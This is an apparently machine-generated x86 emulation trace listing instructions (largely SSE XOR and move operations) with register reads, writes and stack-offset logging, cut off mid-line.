pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432a67: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x432a6b: movaps xmm4, xmm3, regs_read: [125], regs_write: [126] 0x432a6e: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432a79: movaps xmm1, xmm4, regs_read: [126], regs_write: [123] 0x432a81: pxor xmm1, xmm7, regs_read: [123, 129], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432a85: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x432a88: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432a90: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432a99: movaps xmm7, xmm2, regs_read: [124], regs_write: [129] 0x432a9c: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432aa0: movaps xmm1, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x432ab4: movaps xmm2, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432ab8: movaps xmmword ptr [ebp - 0x40], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x432ac0: movaps xmm5, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x432ae9: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432aed: movaps xmmword ptr [ebp - 0x190], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x432af4: pxor xmm0, xmmword ptr [ebp - 0x190], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7e70 for stack size 0x10000 0x432b01: movaps xmmword ptr [ebp - 0x40], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x432b0a: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x432b11: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x432b15: movaps xmm4, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x432b19: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432b21: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432b31: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x432b40: pxor xmm7, xmm1, regs_read: [129, 123], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432b44: movaps xmmword ptr [ebp - 0x50], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x432b5d: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432b65: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432b69: movaps xmmword ptr [ebp - 0x150], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x432b79: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432b86: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x432b8a: movaps xmmword ptr [ebp - 0x20], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x432b8e: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x432b91: movaps xmm4, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432b99: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x432ba0: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432ba4: movaps xmm1, xmm4, regs_read: [126], regs_write: [123] 0x432ba7: movaps xmm2, xmmword ptr [ebp - 0x140], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 0x432bae: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x432bbf: pxor xmm1, xmm7, regs_read: [123, 129], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432bc3: movaps xmmword ptr [ebp - 0x140], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x432bca: movaps xmm7, xmmword ptr [ebp - 0x140], regs_read: [20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 0x432bd1: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432bd5: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x432be1: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432be5: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432be9: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x432bf8: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432c0d: movaps xmmword ptr [ebp - 0x140], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x432c14: pxor xmm1, xmmword ptr [ebp - 0x140], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 0x432c1c: movaps xmm7, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7e20 for stack size 0x10000 0x432c34: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432c38: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x432c3c: movaps xmmword ptr [ebp - 0x1e0], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x432c48: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x432c4f: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x432c52: movaps xmm4, xmmword ptr [ebp - 0xf0], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x432c5d: movaps xmm5, xmmword ptr [ebp - 0x1f0], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7e10 for stack size 0x10000 0x432c64: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432c79: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432c84: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432c91: movaps xmm3, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432c9d: movaps xmmword ptr [ebp - 0xf0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x432ca4: pxor xmm3, xmm5, regs_read: [125, 127], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432ca8: movaps xmmword ptr [ebp - 0x1f0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e10 for stack size 0x10000 saving data to stack: 0 16 0x432cb8: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432cc5: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x432cc8: movaps xmmword ptr [ebp - 0x20], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x432cd0: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x432cd7: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x432cda: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432cde: movaps xmm1, xmm4, regs_read: [126], regs_write: [123] 0x432ce1: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432ce5: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432cec: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x432cfd: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432d01: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x432d04: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x432d07: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432d0b: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432d1b: movaps xmm2, xmmword ptr [ebp - 0x1a0], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7e60 for stack size 0x10000 0x432d34: movaps xmmword ptr [ebp - 0x1a0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x432d3b: movaps xmm2, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7e50 for stack size 0x10000 0x432d54: pxor xmm1, xmmword ptr [ebp - 0x1a0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7e60 for stack size 0x10000 0x432d5c: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432d6a: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x432d6d: movaps xmmword ptr [ebp - 0xf0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x432d78: movaps xmmword ptr [ebp - 0x1b0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x432d7f: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x432d86: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432d89: movaps xmm5, xmmword ptr [ebp - 0x100], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x432d90: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432da5: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432db2: movaps xmm3, xmmword ptr [ebp - 0xf0], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x432dbd: movaps xmm4, xmmword ptr [ebp - 0x1c0], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7e40 for stack size 0x10000 0x432dc4: pxor xmm3, xmm5, regs_read: [125, 127], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432ddd: movaps xmmword ptr [ebp - 0x100], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x432de4: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x432de7: movaps xmmword ptr [ebp - 0xf0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x432df2: movaps xmmword ptr [ebp - 0x1c0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x432df9: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432dfd: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x432e09: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432e0d: movaps xmm2, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7ea0 for stack size 0x10000 0x432e1c: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x432e23: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x432e2f: movaps xmm1, xmm4, regs_read: [126], regs_write: [123] 0x432e32: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432e36: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432e3a: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x432e46: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432e4a: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x432e59: movaps xmm0, xmmword ptr [ebp - 0xf0], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x432e64: movaps xmmword ptr [ebp - 0x160], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x432e6b: movaps xmm2, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7e90 for stack size 0x10000 0x432e8e: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432e92: pxor xmm7, xmmword ptr [ebp - 0x160], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7ea0 for stack size 0x10000 0x432ea4: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x432ea7: movaps xmmword ptr [ebp - 0x170], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x432eb2: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432eb5: movaps xmmword ptr [ebp - 0x100], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x432ebc: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432ec0: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x432ecc: movaps xmm3, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 0x432edc: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432ee9: movaps xmm5, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 0x432efc: movaps xmmword ptr [ebp - 0x80], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x432f04: movaps xmm3, xmmword ptr [ebp - 0x100], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x432f0b: pxor xmm7, xmm5, regs_read: [129, 127], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432f0f: pxor xmm3, xmmword ptr [ebp - 0x80], regs_read: [125, 20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 0x432f26: movaps xmmword ptr [ebp - 0x110], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x432f2d: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x432f34: movaps xmmword ptr [ebp - 0x100], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x432f3b: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x432f3e: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x432f41: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432f49: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432f4c: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x432f53: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432f5c: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432f60: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x432f67: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x432f6f: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x432f72: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432f76: movaps xmm1, xmmword ptr [ebp - 0x100], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x432f89: movaps xmm2, xmmword ptr [ebp - 0x1d0], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7e30 for stack size 0x10000 0x432f9f: movaps xmmword ptr [ebp - 0x1d0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x432fa6: movaps xmm2, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 0x432fbc: pxor xmm1, xmmword ptr [ebp - 0x1d0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7e30 for stack size 0x10000 0x432fc4: movaps xmmword ptr [ebp - 0x70], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x432fc8: pxor xmm0, xmmword ptr [ebp - 0x70], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7f90 for stack size 0x10000 0x432fd7: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x432fde: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x432fe5: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x432fe8: movaps xmm5, xmmword ptr [ebp - 0xb0], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x432fef: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x433004: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x433011: movaps xmm4, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x433021: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x433032: movaps xmmword ptr [ebp - 0xb0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x433039: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43303d: movaps xmmword ptr [ebp - 0xc0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x43304d: movaps xmm4, xmm2, regs_read: [124], regs_write: [126] 0x433050: movaps xmmword ptr [ebp - 0x180], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x43305b: movaps xmm2, xmm7, regs_read: [129], regs_write: [124] 0x43305e: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x433065: pxor xmm4, xmmword ptr [ebp - 0xc0], regs_read: [126, 20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x43306d: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x433071: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x433074: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x433077: pxor xmm2, xmmword ptr [ebp - 0xb0], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 0x456e92: mov edi, eax, regs_read: [19], regs_write: [23] 0x456e96: mov edi, 0x446554, regs_read: (), regs_write: [23] 0x456e9b: mov eax, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8014 for stack size 0x10000 0x456eb4: push 2, regs_read: [30], regs_write: [30] 0x456eb6: pop ecx, regs_read: [30], regs_write: [30, 22] 0x456ece: mov dword ptr [ebp - 0x1c], 0x4d4d9c, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066140 4 0x456eda: mov dword ptr [ebp - 0x20], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x456edd: mov dword ptr [ebp - 0x1c], 0x4d4d9c, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066140 4 0x456ee9: mov dword ptr [ebp - 0x1c], 0x4d4d98, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066136 4 0x456ef5: mov dword ptr [ebp - 0x20], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x456ef8: mov dword ptr [ebp - 0x1c], 0x4d4d98, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066136 4 0x456f04: mov dword ptr [ebp - 0x20], 3, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 3 4 0x456f0b: mov dword ptr [ebp - 0x1c], 0x4d4d90, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066128 4 0x456f2a: mov dword ptr [ebp - 0x1c], 0x4d4d94, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066132 4 0x456f31: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x456f34: mov ecx, edi, regs_read: [23], regs_write: [22] 0x456f36: mov esi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x456f39: mov dword ptr [ebp - 0x20], 4, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 4 4 0x456f42: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x456f52: push eax, regs_read: [30, 19], regs_write: [30] 0x456f5e: pop ecx, regs_read: [30], regs_write: [30, 22] 0x456f64: mov dword ptr [ebp - 0x20], 3, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 3 4 0x456f70: mov dword ptr [ebp - 0x1c], 0x4d4d90, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066128 4 0x456f7b: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x456fb2: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x456fb9: mov dword ptr [ebp - 0x1c], 0x4d4dbc, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066172 4 0x456fc2: mov dword ptr [ebp - 0x1c], 0x4d4dc4, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066180 4 0x456fcb: mov dword ptr [ebp - 0x1c], 0x4d4ddc, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066204 4 0x456fd4: mov dword ptr [ebp - 0x1c], 0x4d4d94, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066132 4 0x456fdb: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x456fde: mov ecx, edi, regs_read: [23], regs_write: [22] 0x456fe0: mov esi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x456fe3: mov dword ptr [ebp - 0x20], 1, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 1 4 0x456fec: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x456ffc: push eax, regs_read: [30, 19], regs_write: [30] 0x457008: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457012: mov dword ptr [eax], 0x21, regs_read: [19], regs_write: () 0x45701a: mov dword ptr [ebp - 0x20], 2, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 2 4 0x457021: mov dword ptr [ebp - 0x1c], 0x4d4d94, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe4 for stack size 0x10000 saving data to stack: 5066132 4 0x457028: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x45702b: mov ecx, edi, regs_read: [23], regs_write: [22] 0x45702d: mov esi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x457032: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x457042: push eax, regs_read: [30, 19], regs_write: [30] 0x45704e: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457058: mov dword ptr [eax], 0x22, regs_read: [19], regs_write: () 0x457063: pop edi, regs_read: [30], regs_write: [30, 23] 0x457064: pop esi, regs_read: 